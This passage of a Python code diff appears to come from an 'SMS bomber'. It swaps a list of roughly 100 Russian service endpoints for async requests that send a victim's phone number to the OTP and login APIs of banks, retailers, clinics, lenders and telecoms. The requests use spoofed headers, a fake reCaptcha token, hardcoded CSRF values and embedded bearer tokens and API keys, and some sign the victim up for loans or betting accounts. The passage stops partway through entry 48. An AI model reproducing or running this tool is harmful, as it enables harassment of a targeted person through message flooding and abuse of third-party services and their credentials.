-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 80. СберПрайм ────────────────────────────────────────────────────
-        {
-            "name": "СберПрайм",
-            "method": "POST",
-            "url": "https://sberprime.sber.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 81. Кинопоиск ────────────────────────────────────────────────────
-        {
-            "name": "Кинопоиск",
-            "method": "POST",
-            "url": "https://api.kinopoisk.ru/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 82. Иви ──────────────────────────────────────────────────────────
-        {
-            "name": "Иви",
-            "method": "POST",
-            "url": "https://api.ivi.ru/mobileapi/user/auth/v7",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus, "type": "sms"},
-            "success_codes": [200, 400],
-        },
-        # ── 83. More.tv ──────────────────────────────────────────────────────
-        {
-            "name": "More.tv",
-            "method": "POST",
-            "url": "https://more.tv/api/v4/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 84. Okko ─────────────────────────────────────────────────────────
-        {
-            "name": "Okko",
-            "method": "POST",
-            "url": "https://okko.tv/api/v3/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 85. Яндекс.Музыка ────────────────────────────────────────────────
-        {
-            "name": "Яндекс.Музыка",
-            "method": "POST",
-            "url": "https://music.yandex.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 86. Ростелеком ───────────────────────────────────────────────────
-        {
-            "name": "Ростелеком",
-            "method": "POST",
-            "url": "https://lk.rt.ru/api/auth/v2/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 87. 2ГИС ─────────────────────────────────────────────────────────
-        {
-            "name": "2ГИС",
-            "method": "POST",
-            "url": "https://account.2gis.ru/v1/auth/phone/otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 88. Calltouch ────────────────────────────────────────────────────
-        {
-            "name": "Calltouch",
-            "method": "POST",
-            "url": "https://app.calltouch.ru/auth/v1/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 89. Учёба.ру ─────────────────────────────────────────────────────
-        {
-            "name": "Учёба.ру",
-            "method": "POST",
-            "url": "https://www.ucheba.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 90. Skillbox ─────────────────────────────────────────────────────
-        {
-            "name": "Skillbox",
-            "method": "POST",
-            "url": "https://skillbox.ru/api/v1/auth/phone/send-code",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 91. Geekbrains ───────────────────────────────────────────────────
-        {
-            "name": "Geekbrains",
-            "method": "POST",
-            "url": "https://gb.ru/api/v1/users/send_sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 92. Яндекс.Практикум ─────────────────────────────────────────────
-        {
-            "name": "Яндекс.Практикум",
-            "method": "POST",
-            "url": "https://practicum.yandex.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 93. Сбер.Класс ───────────────────────────────────────────────────
-        {
-            "name": "СберКласс",
-            "method": "POST",
-            "url": "https://sber-class.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 94. Медси ────────────────────────────────────────────────────────
-        {
-            "name": "Медси",
-            "method": "POST",
-            "url": "https://medsi.ru/api/v1/auth/phone/sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 95. Гемотест ─────────────────────────────────────────────────────
-        {
-            "name": "Гемотест",
-            "method": "POST",
-            "url": "https://gemotest.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 96. INVITRO ──────────────────────────────────────────────────────
-        {
-            "name": "INVITRO",
-            "method": "POST",
-            "url": "https://www.invitro.ru/api/v1/auth/otp",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 97. Doctis ───────────────────────────────────────────────────────
-        {
-            "name": "Doctis",
-            "method": "POST",
-            "url": "https://doctis.ru/api/v2/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 98. СберЗдоровье ─────────────────────────────────────────────────
-        {
-            "name": "СберЗдоровье",
-            "method": "POST",
-            "url": "https://sberzdorovie.ru/api/v3/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 99. ПолисОнлайн ──────────────────────────────────────────────────
-        {
-            "name": "ПолисОнлайн",
-            "method": "POST",
-            "url": "https://polisonline.ru/api/v1/auth/phone",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-        # ── 100. Тинькофф Страхование ────────────────────────────────────────
-        {
-            "name": "Tinkoff Страхование",
-            "method": "POST",
-            "url": "https://insurance.tinkoff.ru/api/v1/auth/send-sms",
-            "headers": {
-                "Content-Type": "application/json",
-                "User-Agent": "Mozilla/5.0",
-            },
-            "json": {"phone": phone_plus},
-            "success_codes": [200, 400],
-        },
-    ]
+    # Форматы для специфичных сервисов
+    winelab = f'{p[1]}{p[2]}{p[3]}%20{p[4]}{p[5]}{p[6]}%20{p[7]}{p[8]}%20{p[9]}{p[10]}'
+    profi_fmt = f'7 {p[1]}{p[2]}{p[3]}-{p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}'
+    letu_fmt = f'+7 ({p[1]}{p[2]}{p[3]}) {p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}'
+    growfood_fmt = f'{p[1]}{p[2]}{p[3]} {p[4]}{p[5]}{p[6]} {p[7]}{p[8]} {p[9]}{p[10]}'
+    madyart_fmt = f'+7 ({p[1]}{p[2]}{p[3]}) {p[4]}{p[5]}{p[6]} - {p[7]}{p[8]} - {p[9]}{p[10]}'
 
-    return services
+    t = TIMEOUT
 
-
-async def _send_one(session: aiohttp.ClientSession, service: dict, idx: int) -> tuple[str, str, str]:
-    """
-    Отправляет один запрос к сервису.
-    Возвращает (name, status_str, code)
-    """
-    name = service["name"]
-    url = service["url"]
-    method = service.get("method", "POST")
-    headers = service.get("headers", {})
-    json_data = service.get("json")
-    form_data = service.get("data")
-    success_codes = service.get("success_codes", [200])
-
-    try:
-        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
-        if method == "POST":
-            if json_data is not None:
-                async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
-                    code = str(resp.status)
-                    ok = resp.status in success_codes
-            elif form_data is not None:
-                async with session.post(url, data=form_data, headers=headers, timeout=timeout, ssl=False) as resp:
-                    code = str(resp.status)
-                    ok = resp.status in success_codes
-            else:
-                async with session.post(url, headers=headers, timeout=timeout, ssl=False) as resp:
-                    code = str(resp.status)
-                    ok = resp.status in success_codes
-        else:
-            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
+    async def req(name: str, coro):
+        try:
+            async with asyncio.timeout(t):
+                resp = await coro
                 code = str(resp.status)
-                ok = resp.status in success_codes
+                icon = "✅" if resp.status in (200, 201, 202, 204, 400, 401) else "❌"
+                print(f"[SMS] {name:30s} → {icon} {code}", flush=True)
+                results.append((name, icon, code))
+        except TimeoutError:
+            print(f"[SMS] {name:30s} → ⏱ TIMEOUT", flush=True)
+            results.append((name, "⏱", "TIMEOUT"))
+        except Exception as e:
+            short = str(e)[:35]
+            print(f"[SMS] {name:30s} → ❌ {short}", flush=True)
+            results.append((name, "❌", short))
 
-        status_str = "✅" if ok else "❌"
-        print(f"[SMS] #{idx:03d} {name:25s} → {status_str} {code}", flush=True)
-        return name, status_str, code
+    # ── 1. MTS Bank ──────────────────────────────────────────────────────────
+    await req("MTS Bank", session.post(
+        "https://sso.mtsbank.ru/api/v2/login",
+        json={"login": p},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://sso.mtsbank.ru", "Host": "sso.mtsbank.ru"}
+    ))
 
-    except asyncio.TimeoutError:
-        print(f"[SMS] #{idx:03d} {name:25s} → ⏱ TIMEOUT", flush=True)
-        return name, "⏱", "TIMEOUT"
-    except Exception as e:
-        short_err = str(e)[:40]
-        print(f"[SMS] #{idx:03d} {name:25s} → ❌ ERR: {short_err}", flush=True)
-        return name, "❌", f"ERR: {short_err}"
+    # ── 2. Winelab ────────────────────────────────────────────────────────────
+    await req("Winelab", session.get(
+        f"https://www.winelab.ru/confirmation/sendByPhone?number={winelab}",
+        headers={"User-Agent": user, "Referer": "https://www.winelab.ru/",
+                 "X-Requested-With": "XMLHttpRequest"}
+    ))
+
+    # ── 3. Profi.ru ───────────────────────────────────────────────────────────
+    await req("Profi.ru", session.post(
+        "https://spb.profi.ru/graphql",
+        json={"query": "query authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) { authStrategyStart(type: $type, initialState: $initialState) { strategy { strategyDescriptor } } }",
+              "variables": {"type": "phone", "initialState": {"phoneNumber": profi_fmt, "defaultOrderCityId": "prfr", "currentHost": "https://profi.ru"}}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "x-app-id": "PROFI", "x-new-auth-compatible": "1",
+                 "Origin": "https://profi.ru", "Referer": "https://profi.ru/cabinet/login/"}
+    ))
+
+    # ── 4. Chitai-gorod ───────────────────────────────────────────────────────
+    await req("Читай-город", session.post(
+        "https://web-gate.chitai-gorod.ru/api/v1/auth/code",
+        json={"phone": p, "cgsing": {"type": "reCaptcha", "payload": {"token": "fake_token", "action": "getSMSCode", "version": "rv3"}}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.chitai-gorod.ru", "Referer": "https://www.chitai-gorod.ru/"}
+    ))
+
+    # ── 5. VerifyKit ──────────────────────────────────────────────────────────
+    await req("VerifyKit", session.post(
+        "https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246",
+        data={"countryCode": "RU", "isMobileBrowser": "0", "phoneOperatingSystem": "android", "phoneNumber": pp},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "Origin": "https://widget.verifykit.com", "X-Requested-With": "XMLHttpRequest"}
+    ))
+
+    # ── 6. Sunlight ───────────────────────────────────────────────────────────
+    await req("Sunlight", session.post(
+        "https://api.sunlight.net/v3/customers/authorization/",
+        json={"phone": pp, "flashcall": True},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://sunlight.net", "X-Requested-With": "SunlightFrontendApp"}
+    ))
+
+    # ── 7. Citilink ───────────────────────────────────────────────────────────
+    await req("Citilink", session.post(
+        f"https://www.citilink.ru/registration/confirm/phone/{pp}/",
+        headers={"User-Agent": user, "Origin": "https://www.citilink.ru",
+                 "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}
+    ))
+
+    # ── 8. Raiffeisen (1) ─────────────────────────────────────────────────────
+    await req("Raiffeisen #1", session.post(
+        "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms",
+        json={"number": p},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.raiffeisen.ru", "Host": "oapi.raiffeisen.ru"}
+    ))
+
+    # ── 9. Raiffeisen (2) ─────────────────────────────────────────────────────
+    await req("Raiffeisen #2", session.post(
+        "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms",
+        json={"number": p},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.raiffeisen.ru", "Referer": "https://www.raiffeisen.ru/"}
+    ))
+
+    # ── 10. Madyart ───────────────────────────────────────────────────────────
+    await req("Madyart", session.post(
+        "https://madyart.ru/local/aut.php",
+        data={"wct_reg_fio": "Пупкин", "wct_reg_fio2": "Василий",
+              "wct_reg_phone": madyart_fmt, "wct_reg_ch": "Y",
+              "wc_phone_psw": "sdfgwse5rgfdzvbsedf", "wc_phone_psw2": "sdfgwse5rgfdzvbsedf"},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "Origin": "https://madyart.ru", "X-Requested-With": "XMLHttpRequest"}
+    ))
+
+    # ── 11. Growfood ──────────────────────────────────────────────────────────
+    await req("Growfood", session.post(
+        "https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms",
+        json={"analyticalData": {"cookie": {}, "utm": {}, "referrer": None, "host": "growfood.pro"},
+              "client": {"phone": growfood_fmt, "cityId": 2}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://growfood.pro", "Referer": "https://growfood.pro/"}
+    ))
+
+    # ── 12. Letu (GET) ────────────────────────────────────────────────────────
+    await req("Letu (GET)", session.get(
+        f"https://www.letu.ru/s/api/user/account/v1/verifications/phone?pushSite=storeMobileRU"
+        f"&phone=%2B7+%28{p[1]}{p[2]}{p[3]}%29+{p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}",
+        headers={"User-Agent": user, "Referer": "https://www.letu.ru/"}
+    ))
+
+    # ── 13. Letu (POST) ───────────────────────────────────────────────────────
+    await req("Letu (POST)", session.post(
+        "https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU",
+        json={"captcha": "", "phoneNumber": letu_fmt},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.letu.ru", "Referer": "https://www.letu.ru/"}
+    ))
+
+    # ── 14. Evraz ─────────────────────────────────────────────────────────────
+    await req("Evraz", session.post(
+        "https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms",
+        data={"userPhone": letu_fmt, "captchaCode": "", "captchaWord": "", "sessid": "ce46266c9ca3de6414e13d163615c827"},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "bx-ajax": "true", "Origin": "https://evraz.market"}
+    ))
+
+    # ── 15. ABC.ru ────────────────────────────────────────────────────────────
+    await req("ABC.ru", session.post(
+        "https://abc.ru/clientapi/v1/user/phone-sms/",
+        json={"phone": pp, "country_id": 1, "scenario": "registration",
+              "_csrf": "oqqL7n8CPs-K8TyRRe11rFxa0lUmFcqXKMx-KWjt6"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://abc.ru", "Referer": "https://abc.ru/registration/"}
+    ))
+
+    # ── 16. Mosmetro ──────────────────────────────────────────────────────────
+    await req("Mosmetro", session.post(
+        "https://auth.mosmetro.ru/api/auth/login/sms",
+        json={"login": p, "returnUrl": "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&response_type=code"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://auth.mosmetro.ru", "Referer": "https://auth.mosmetro.ru/signin"}
+    ))
+
+    # ── 17. Uteka (SPB) ───────────────────────────────────────────────────────
+    await req("Uteka (SPB)", session.post(
+        "https://spb.uteka.ru/rpc/?method=auth.GetCode",
+        json={"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode",
+              "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://spb.uteka.ru", "Referer": "https://spb.uteka.ru/"}
+    ))
+
+    # ── 18. Uteka (Krym) ──────────────────────────────────────────────────────
+    await req("Uteka (Krym)", session.post(
+        "https://krym.uteka.ru/rpc/?method=auth.GetCode",
+        json={"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode",
+              "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://krym.uteka.ru", "Referer": "https://krym.uteka.ru/"}
+    ))
+
+    # ── 19. Elementaree ───────────────────────────────────────────────────────
+    await req("Elementaree", session.post(
+        "https://api-new.elementaree.ru/graphql",
+        json={"operationName": "phoneVerification", "variables": {"phone": p},
+              "query": "mutation phoneVerification($phone: String!) { phoneVerification(phone: $phone) { success interval } }"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://elementaree.ru", "Referer": "https://elementaree.ru/",
+                 "Authorization": "Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn"}
+    ))
+
+    # ── 20. Lenta Online ──────────────────────────────────────────────────────
+    await req("Lenta Online", session.post(
+        "https://moscow.online.lenta.com/jrpc",
+        json={"method": "authCodeSend", "params": {"phone": p}, "jsonrpc": "2.0", "id": 12},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://moscow.online.lenta.com", "x-domain": "moscow", "x-retail-brand": "lo"}
+    ))
+
+    # ── 21. Auchan ────────────────────────────────────────────────────────────
+    await req("Auchan", session.get(
+        "https://www.auchan.ru/v1/cmd/clientprofile/checkphone",
+        headers={"User-Agent": user, "phone": p, "source": "4",
+                 "Referer": "https://www.auchan.ru/auth/"}
+    ))
+
+    # ── 22. Victoria Group ────────────────────────────────────────────────────
+    await req("Victoria Group", session.post(
+        "https://lk.victoria-group.ru/identity/registration",
+        json=f'{{"MobilePhone":"{pp}","CardNumber":null,"AgreeToTerms":1,"AllowNotification":0,"DeviceId":"gl3llll8mih00hxy1xg6j23c"}}',
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://lk.victoria-group.ru", "Referer": "https://lk.victoria-group.ru/"}
+    ))
+
+    # ── 23. Svyaznoy (1) ─────────────────────────────────────────────────────
+    await req("Svyaznoy #1", session.post(
+        f"https://www.svyaznoy.ru/api/v2/sms-verification-code/{p[1:]}",
+        headers={"User-Agent": user, "Origin": "https://www.svyaznoy.ru",
+                 "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}
+    ))
+
+    # ── 24. Svyaznoy (2) ─────────────────────────────────────────────────────
+    await req("Svyaznoy #2", session.post(
+        f"https://www.svyaznoy.ru/api/v2/sms-verification-code/{p[1:]}",
+        headers={"User-Agent": user, "Origin": "https://www.svyaznoy.ru",
+                 "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}
+    ))
+
+    # ── 25. OneTwoTrip ────────────────────────────────────────────────────────
+    await req("OneTwoTrip", session.patch(
+        "https://www.onetwotrip.com/_auth/profile/phone/with-confirm",
+        json={"phone": pp, "reseller": ""},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.onetwotrip.com"}
+    ))
+
+    # ── 26. Zdorov.ru ─────────────────────────────────────────────────────────
+    await req("Zdorov.ru", session.post(
+        "https://zdorov.ru/backend/api/customer/confirm",
+        json={"phone": p, "deviceId": "6adada4b-b83b-406a-ac5b-b6101d282cdc", "term": 2},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://zdorov.ru", "Referer": "https://zdorov.ru/"}
+    ))
+
+    # ── 27. Sokolov ───────────────────────────────────────────────────────────
+    await req("Sokolov", session.post(
+        "https://sokolov.ru/api/v4/profile/user/send-code",
+        json={"data": {"type": "login", "attributes": {"phone": p, "uid_captcha": None, "code_captcha": None}}},
+        headers={"Content-Type": "application/vnd.api+json", "User-Agent": user,
+                 "Origin": "https://sokolov.ru", "Referer": "https://sokolov.ru/"}
+    ))
+
+    # ── 28. TSUM ──────────────────────────────────────────────────────────────
+    await req("TSUM", session.post(
+        "https://api.tsum.ru/v2/authorize/request-sms",
+        json={"data": {"type": "requestSMS", "attributes": {"phone": pp}}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.tsum.ru", "Referer": "https://www.tsum.ru/"}
+    ))
+
+    # ── 29. Megafon.TV ────────────────────────────────────────────────────────
+    await req("Megafon.TV", session.post(
+        "https://bmp.megafon.tv/api/v10/auth/register/msisdn",
+        json={"msisdn": pp, "password": "200147200147"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://megafon.tv", "Referer": "https://megafon.tv/"}
+    ))
+
+    # ── 30. Auto.ru ───────────────────────────────────────────────────────────
+    await req("Auto.ru", session.post(
+        "https://auth.auto.ru/-/ajax/auth/",
+        json={"items": [{"path": "auth/login-or-register", "params": {"phone": p, "retpath": "https://auto.ru/"}}]},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://auth.auto.ru", "Referer": "https://auth.auto.ru/login/"}
+    ))
+
+    # ── 31. ShoppingLive ──────────────────────────────────────────────────────
+    await req("ShoppingLive", session.post(
+        "https://www.shoppinglive.ru/phone-verification/send-code",
+        data={"mobilePhone": p[1:], "CSRFToken": "00bc3ff8-f081-483d-ab0e-bb026785114f"},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "Origin": "https://www.shoppinglive.ru", "Referer": "https://www.shoppinglive.ru/"}
+    ))
+
+    # ── 32. Leomax ────────────────────────────────────────────────────────────
+    await req("Leomax", session.post(
+        "https://ap.leomax.ru/siteapi/auth/authcode",
+        json={"phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://auth.k8s.leomax.ru", "Referer": "https://auth.k8s.leomax.ru/"}
+    ))
+
+    # ── 33. Tele2 ─────────────────────────────────────────────────────────────
+    await req("Tele2", session.post(
+        f"https://msk.tele2.ru/api/validation/number/{p}",
+        json={"sender": "Tele2"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://msk.tele2.ru", "tele2-user-agent": "web"}
+    ))
+
+    # ── 34. ICQ ───────────────────────────────────────────────────────────────
+    await req("ICQ", session.post(
+        "https://u.icq.net/api/v89/rapi/auth/sendCode",
+        json={"reqId": "85231-1668029727", "params": {"phone": p, "language": "ru-RU",
+              "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://web.icq.com", "Referer": "https://web.icq.com/"}
+    ))
+
+    # ── 35. Sravni.ru ─────────────────────────────────────────────────────────
+    await req("Sravni.ru", session.post(
+        "https://my.sravni.ru/signin/code",
+        data={"__RequestVerificationToken": "CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41S",
+              "phone": pp, "returnUrl": "/user/profile"},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "Origin": "https://my.sravni.ru", "Referer": "https://my.sravni.ru/signin"}
+    ))
+
+    # ── 36. Vprok.ru ──────────────────────────────────────────────────────────
+    await req("Vprok.ru", session.post(
+        "https://www.vprok.ru/as_send_pin",
+        data={"phone": p},
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "Origin": "https://www.vprok.ru", "Referer": "https://www.vprok.ru/"}
+    ))
+
+    # ── 37. Zaymigo ───────────────────────────────────────────────────────────
+    await req("Zaymigo", session.post(
+        "https://borrow.zaymigo.com/rpc/v1",
+        json={"jsonrpc": "2.0", "id": "15930021-2bf0-4be4-acef-065304196abb", "method": "create",
+              "params": {"borrower": {"surname": "Пупкин", "name": "Василий", "patronymic": "Андреевич",
+                                      "patronymicNotExists": False, "phone": pp, "email": email},
+                         "term": 12, "amount": 10000,
+                         "agreements": [{"name": "assignment_of_claims", "val": True}]}},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://borrow.zaymigo.com", "Referer": "https://borrow.zaymigo.com/"}
+    ))
+
+    # ── 38. Adengi ────────────────────────────────────────────────────────────
+    await req("Adengi", session.post(
+        "https://adengi.ru/rest/v1/registration/code/send",
+        json={"email": email, "firstName": "Василий", "hash": "a6ac90134b55d015bd2731fd4e2f06d3",
+              "lastName": "Пупин", "middleName": "Иванович", "phone": p,
+              "timestamp": 1667680555, "via": "sms"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://adengi.ru", "Referer": "https://adengi.ru/registration/personal"}
+    ))
+
+    # ── 39. B-Apteka ──────────────────────────────────────────────────────────
+    await req("B-Apteka", session.post(
+        "https://b-apteka.ru/lk/send_confirm_code",
+        json={"phone": p, "_token": "G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://b-apteka.ru", "X-Requested-With": "XMLHttpRequest"}
+    ))
+
+    # ── 40. Wheely ────────────────────────────────────────────────────────────
+    await req("Wheely", session.post(
+        "https://api.wheely.com/v6/auth/oauth/token",
+        json={"app_id": "55e085968a5da59241000001", "phone": pp},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://wheely.com", "Referer": "https://wheely.com/"}
+    ))
+
+    # ── 41. Fonbet ────────────────────────────────────────────────────────────
+    await req("Fonbet", session.post(
+        "https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess",
+        json={"birthday": "2000-10-25", "deviceId": "2340BBFFD39BD54C3A914A90D5582A63",
+              "ecupis": True, "email": "", "lang": "ru", "password": "Hoho_HO123",
+              "phoneNumber": pp, "sysId": 1, "webReferrer": "https://www.fon.bet/"},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Origin": "https://www.fon.bet", "Referer": "https://www.fon.bet/account/registration/"}
+    ))
+
+    # ── 42. Acuvue ────────────────────────────────────────────────────────────
+    await req("Acuvue", session.post(
+        "https://api.myacuvuepro.ru/myacuvue/oauth/mobile",
+        json={"phoneNumber": p},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "x-api-key": "XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu", "x-app-version": "PWA 2.3.1",
+                 "Origin": "https://www.myacuvue.acuvue.ru", "Referer": "https://www.myacuvue.acuvue.ru/"}
+    ))
+
+    # ── 43. Smartseeds ────────────────────────────────────────────────────────
+    await req("Smartseeds", session.post(
+        "https://smartseeds.ru/api/native/v1.0/cargo-owner/validate",
+        json={"profileDetails": {"individualTaxpayerNumber": "6163027810", "farmer": False},
+              "contactFullName": "Бла бла", "email": email,
+              "password": "testpassword1234", "phoneNumber": p},
+        headers={"Content-Type": "application/json", "User-Agent": user,
+                 "Authorization": "Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw",
+                 "Origin": "https://smartseeds.ru"}
+    ))
+
+    # ── 44. X5 GraphQL ────────────────────────────────────────────────────────
+    await req("X5 GraphQL", session.post(
+        "https://id.x5.ru/graphql",
+        json={"query": f'{{ user_credentials(login:"{p}") {{login}}}}'},
+        headers={"Content-Type": "text/plain;charset=UTF-8", "User-Agent": user,
+                 "Origin": "https://id.x5.ru"}
+    ))
+
+    # ── 45. DNS-shop ──────────────────────────────────────────────────────────
+    await req("DNS", session.post(
+        "https://www.dns-shop.ru/user/send-otp/",
+        data=f"phone={pp}",
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user,
+                 "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.dns-shop.ru"}
+    ))
+
+    # ── 46. OK.ru ─────────────────────────────────────────────────────────────
+    await req("OK.ru", session.post(
+        "https://ok.ru/api/auth/login",
+        data=f"phone={pp}",
+        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user}
+    ))
+
+    # ── 47. Wildberries ───────────────────────────────────────────────────────
+    await req("Wildberries", session.post(
+        "https://user-order.wildberries.ru/api/v2/auth/login",
+        json={"phone": int(p), "deviceId": "wbreg" + p[:6]},
+        headers={"Content-Type": "application/json", "User-Agent": user}
+    ))
+
+    # ── 48. СберЗдоровье ──────────────────────────────────────────────────────
+    await req("СберЗдоровье", session.post(
